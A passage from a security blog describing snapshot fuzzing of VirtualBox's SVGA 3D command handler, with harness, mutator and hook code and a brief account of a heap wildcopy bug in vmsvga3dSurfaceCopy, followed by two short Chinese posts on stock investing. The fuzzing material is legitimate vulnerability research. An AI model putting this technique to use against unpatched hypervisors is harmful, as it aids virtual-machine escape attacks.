<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> Gva_t SvgaLoopStart = <span class="built_in">Gva_t</span>(g_Dbg.<span class="built_in">GetSymbol</span>(<span class="string">&quot;VBoxDD!vmsvgaR3FifoLoop&quot;</span>) + <span class="number">0x4e2</span>);</span><br><span class="line"><span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">Setbreakpoint</span>(SvgaLoopStart, [](Backend_t *Backend) &#123;</span><br><span class="line">  <span class="keyword">if</span>(GlobalState.SvgaCmds.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">DebugPrint</span>(<span class="string">&quot;testcase deque empty! goto next round...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> Backend-&gt;<span class="built_in">Stop</span>(<span class="built_in">Ok_t</span>());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">auto</span> &amp;Testcase = GlobalState.SvgaCmds.<span class="built_in">front</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (Testcase.SvgaCmdCode == <span class="number">1045</span>) &#123;</span><br><span class="line">    GlobalState.SvgaCmds.<span class="built_in">pop_front</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(GlobalState.SvgaCmds.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">DebugPrint</span>(<span class="string">&quot;testcase deque empty during cmd filtering! goto next round...\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> Backend-&gt;<span class="built_in">Stop</span>(<span class="built_in">Ok_t</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Testcase = GlobalState.SvgaCmds.<span class="built_in">front</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Backend-&gt;<span class="built_in">Rbx</span>(Testcase.SvgaCmdCode);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">DebugPrint</span>(<span class="string">&quot;SvgaCmdCode = &#123;:#x&#125;\n&quot;</span>, Testcase.SvgaCmdCode);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(Testcase.SvgaCmdCode &gt;= <span class="number">1040</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">DebugPrint</span>(<span class="string">&quot;Have to avoid AssertBreak(pHdr-&gt;size &lt; pThis-&gt;svga.cbFIFO), write &#123;:#x&#125; on first DWORD\n&quot;</span>, Testcase.SvgaBody.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> Svga3dCmdSize = Testcase.SvgaBody.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">if</span>(Svga3dCmdSize &gt;= <span class="number">0x200000</span>) &#123;</span><br><span class="line">      fmt::<span class="built_in">print</span>(<span class="string">&quot;Svga3dCmdSize(&#123;:#x&#125;) &gt; cbFIFO, abort\n&quot;</span>, Svga3dCmdSize);</span><br><span class="line">      std::<span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;GlobalState.SvgaCmdBody[<span class="number">0</span>], &amp;Svga3dCmdSize, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;GlobalState.SvgaCmdBody[<span class="number">4</span>], Testcase.SvgaBody.<span class="built_in">data</span>(), Testcase.SvgaBody.<span class="built_in">size</span>());</span><br><span class="line">    GlobalState.SvgaCmdBodySize = Testcase.SvgaBody.<span class="built_in">size</span>() + <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(GlobalState.SvgaCmdBody, Testcase.SvgaBody.<span class="built_in">data</span>(), Testcase.SvgaBody.<span class="built_in">size</span>());</span><br><span class="line">    GlobalState.SvgaCmdBodySize = Testcase.SvgaBody.<span class="built_in">size</span>();</span><br><span class="line">  &#125;    </span><br><span class="line"></span><br><span class="line">  GlobalState.SvgaCmds.<span class="built_in">pop_front</span>();</span><br><span class="line">&#125;)) &#123;</span><br><span class="line">  fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to Setbreakpoint on SvgaLoopStart\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>After some investigation, I found <code>CreateDeviceEx</code> call in <code>vmsvga3dContextDefine</code> keep causing <strong>CR3 context switching</strong> and I didn’t found any way to handling it using breakpoint handler. So I just blacklisting it( <code>SVGA_3D_CMD_CONTEXT_DEFINE</code> &#x3D; <code>1045</code> ).</p>
<p>I disclose almost every part of fuzz module except mutation part. I just use libfuzzer mutator to mutate body data of SVGA command and pick one of command in array randomly.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">explicit</span> <span class="title">CustomMutator_t</span><span class="params">(std::mt19937_64 &amp;Rng, <span class="type">const</span> <span class="type">size_t</span> TestcaseMaxSize)</span></span></span><br><span class="line"><span class="function">  : Rng_(Rng), TestcaseMaxSize_(TestcaseMaxSize) &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// set maximum size for multiple (mutated) testcase( Default = 1MB )</span></span><br><span class="line">    ScratchBuffer__ = std::<span class="built_in">make_unique</span>&lt;<span class="type">uint8_t</span>[]&gt;(_1MB);</span><br><span class="line">    ScratchBuffer_  = &#123;ScratchBuffer__.<span class="built_in">get</span>(), _1MB&#125;;</span><br><span class="line"></span><br><span class="line">    BodyMutator_ = <span class="built_in">make_unique</span>&lt;LibfuzzerMutator_t&gt;(Rng, TestcaseMaxSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// skip for brevity...</span></span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">Mutate</span><span class="params">(<span class="type">uint8_t</span> *Data, <span class="type">const</span> <span class="type">size_t</span> DataLen, <span class="type">const</span> <span class="type">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> Root = <span class="built_in">Deserialize</span>(Data, DataLen);</span><br><span class="line">  <span class="keyword">auto</span> &amp;SvgaCmds = Root.SvgaCmds;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;SvgaCmd : SvgaCmds) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 50%</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">GetUint32</span>(<span class="number">0</span>, <span class="number">1</span>) == <span class="number">1</span>) &#123;  </span><br><span class="line">      <span class="type">uint32_t</span> SvgaCmdRandomIdx = <span class="built_in">GetUint32</span>(<span class="number">0</span>, SvgaCmdListLen);</span><br><span class="line">      SvgaCmd.SvgaCmdCode = SvgaCmdList[SvgaCmdRandomIdx];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(GlobalMutBuffer, SvgaCmd.SvgaBody.<span class="built_in">data</span>(), SvgaCmd.SvgaBody.<span class="built_in">size</span>());</span><br><span class="line">    <span class="type">size_t</span> NewTestcaseSize = BodyMutator_-&gt;Mut_.<span class="built_in">Mutate</span>(GlobalMutBuffer, SvgaCmd.SvgaBody.<span class="built_in">size</span>(), MaxSize);</span><br><span class="line">    SvgaCmd.SvgaBody.<span class="built_in">resize</span>(NewTestcaseSize);</span><br><span class="line">    <span class="built_in">memcpy</span>(SvgaCmd.SvgaBody.<span class="built_in">data</span>(), GlobalMutBuffer, NewTestcaseSize);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  json::json Serialized;</span><br><span class="line">  <span class="built_in">to_json</span>(Serialized, Root);</span><br><span class="line">  <span class="keyword">return</span> Serialized.<span class="built_in">dump</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>I also define generator function. It is very useful if you are too lazy to create random input like me ^~^.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::string <span class="title">GenerateTestcase</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  SvgaCmds_t Root;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">auto</span> N = <span class="built_in">GetUint32</span>(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> Idx = <span class="number">0</span>; Idx &lt; N; Idx++) &#123;</span><br><span class="line">    SvgaCmd_t SvgaCmd;</span><br><span class="line">    </span><br><span class="line">    SvgaCmd.SvgaCmdCode = SvgaCmdList[<span class="built_in">GetUint32</span>(<span class="number">0</span>, SvgaCmdListLen)];</span><br><span class="line">    SvgaCmd.SvgaBody.<span class="built_in">resize</span>(<span class="built_in">GetUint32</span>(<span class="number">0x100</span>, <span class="number">0x400</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">GetUint32</span>(<span class="number">0</span>, <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; SvgaCmd.SvgaBody.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        SvgaCmd.SvgaBody[i] = <span class="number">0x41</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; SvgaCmd.SvgaBody.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        SvgaCmd.SvgaBody[i] = (<span class="type">uint8_t</span>)<span class="built_in">GetUint32</span>(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Root.SvgaCmds.<span class="built_in">emplace_back</span>(SvgaCmd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  json::json Serialized;</span><br><span class="line">  <span class="built_in">to_json</span>(Serialized, Root);</span><br><span class="line">  <span class="keyword">return</span> Serialized.<span class="built_in">dump</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">GetNewTestcase</span><span class="params">(<span class="type">const</span> Corpus_t &amp;Corpus)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// 20%</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">GetUint32</span>(<span class="number">1</span>, <span class="number">5</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">GenerateTestcase</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> Testcase_t *Testcase = Corpus.<span class="built_in">PickTestcase</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!Testcase) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;The corpus is empty, generate random one\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">GenerateTestcase</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Copy the input in a buffer we&#x27;re going to mutate.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(ScratchBuffer_.<span class="built_in">data</span>(), Testcase-&gt;Buffer_.<span class="built_in">get</span>(),</span><br><span class="line">         Testcase-&gt;BufferSize_);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// return Mutate(ScratchBuffer_.data(), Testcase-&gt;BufferSize_, TestcaseMaxSize_);</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Mutate</span>(ScratchBuffer_.<span class="built_in">data</span>(), Testcase-&gt;BufferSize_, u32PbBounceBufMaxSize - <span class="built_in">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Aaaaannnd, this is everything you need to fuzz! I skip some formal code for brevity, but I think you can easily find what you need to define fully working fuzz module.</p>
<p>…..Ooooh wait, I forgot something. After some hours of struggle, I define a blacklist which cause CR3 context switching. I just put it on the end of <code>Init()</code> function.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SetupVBoxBlacklistHooks</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;VBoxRT!RTLogLoggerEx&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on VBoxRT!RTLogLoggerEx\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;VBoxVMM!PDMCritSectLeave&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on VBoxVMM!PDMCritSectLeave\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;VBoxC!util::AutoLockBase::release&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on VBoxC!util::AutoLockBase::release\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;VBoxC!util::AutoLockBase::acquire&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on VBoxC!util::AutoLockBase::acquire\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;VirtualBoxVM!UIFrameBufferPrivate::NotifyChange&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on VirtualBoxVM!UIFrameBufferPrivate::NotifyChange\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;VBoxRT!SUPSemEventWaitNoResume&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on VBoxRT!SUPSemEventWaitNoResume\n&quot;</span>);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;d3d9!CBaseDevice::Release&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on d3d9!CBaseDevice::Release\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;d3d9!CD3DBase::Clear&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on d3d9!CD3DBase::Clear\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;d3d9!CMipMap::SetAutoGenFilterType&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on d3d9!CMipMap::SetAutoGenFilterType\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;d3d9!CMipMap::GenerateMipSubLevels&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on d3d9!CMipMap::GenerateMipSubLevels\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">SetBreakpoint</span>(<span class="string">&quot;USER32!GetDC&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">    Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(<span class="number">0x1337</span>);</span><br><span class="line">  &#125;)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to SetBreakpoint on USER32!GetDC\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Yep. That’s really everything. I use this fuzz module several hours and it founds interesting crash.</p>
<h1 id="3-Vulnerability-TL-DR"><a href="#3-Vulnerability-TL-DR" class="headerlink" title="3. Vulnerability( TL;DR )"></a>3. Vulnerability( TL;DR )</h1><p>Crash occurred in <code>vmsvga3dSurfaceCopy</code> function( <strong>PageHeap</strong> needed ).</p>
<p><img src="https://github.com/henices/pictures/raw/master/wtf-vbox-blahblah2.png" alt="blahblah2"></p>
<p>This function trying to copy surface data from one to another using surface id and there’s no boundary check between surface, so it become exploitable wildcopy vulnerability in heap memory.</p>
<p><img src="https://github.com/henices/pictures/raw/master/wtf-vbox-blahblah3.png" alt="spot the bug"></p>
<p>This vulnerability patched in <a target="_blank" rel="noopener" href="https://www.oracle.com/security-alerts/cpujul2022.html">6.1.36 release</a> at July, 2022.</p>
<h1 id="4-Conclusion"><a href="#4-Conclusion" class="headerlink" title="4. Conclusion"></a>4. Conclusion</h1><p>I think importance of snapshot fuzzing is, it makes researcher to focus on target itself. </p>
<p>Unlike other fuzzers based on runtime and DBI are often create (very) unreasonable side effect or need lots of time to create working harness. The concept of snapshot fuzzing makes it possible to reduce this waste of time.</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/06/30/stock_emotion/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/06/30/stock_emotion/" class="post-title-link" itemprop="url">市场情绪指标</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-06-30 09:59:36" itemprop="dateCreated datePublished" datetime="2022-06-30T09:59:36+08:00">2022-06-30</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>可以量化一下，有时间考虑程序实现。</p>
<ul>
<li>涨&#x2F;跌停板数</li>
<li>涨停封版成功率</li>
<li>涨跌股票比率</li>
<li>大盘成交量额</li>
<li>融资余额情况</li>
<li>北向资金净流入 （参考）</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/06/17/Automatic_Investment_Plan/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/06/17/Automatic_Investment_Plan/" class="post-title-link" itemprop="url">关于定投的一些思考</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-06-17 13:02:06" itemprop="dateCreated datePublished" datetime="2022-06-17T13:02:06+08:00">2022-06-17</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <ul>
<li>定投只有在低估的时候买，当估值进入中位数以上就不要买了，同时定投标的的估值应该在历史底部区域。</li>
<li>定投的本质不是价值投资，而是相信估值回归中位数。 </li>
<li>指数基金，周期性行业适合定投，比如券商，钢铁，煤炭。一般按时间定投，如果大幅下跌也要买。</li>
</ul>
<p>总的来说定投属于策略型的投资方法，其实并不知道底和顶在哪里，通过拉长时间来降低持仓成本，因此定投成功的关键在于你的成本是否可以随着时间而降下来。从这点也可以分析出在底部区域定投比在顶部区域定投要好得多，这也就是第一条。</p>
<p>定投策略对历史的估值情况有很强的依赖，属于基于历史数据的统计分析，但是每一次的情况都不同，没有人可以保证历史一定会重演。定投也不是价值投资，没有护城河，只是相信均值回归，这是第二条。</p>
<p>巴菲特非常推荐标普500指数 (S&amp;P 500) 定投，指数基金最牛的地方是股票会定期调整，把好的股票加入进来，差的淘汰出去，相当于有人帮你选股了，另外足够分散，发生系统性风险的概率大幅降低。周期性行业则是爆发性很强，三年不开张，开张吃三年，容易在底部积累大量筹码，作为一个长期投资策略非常合适。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
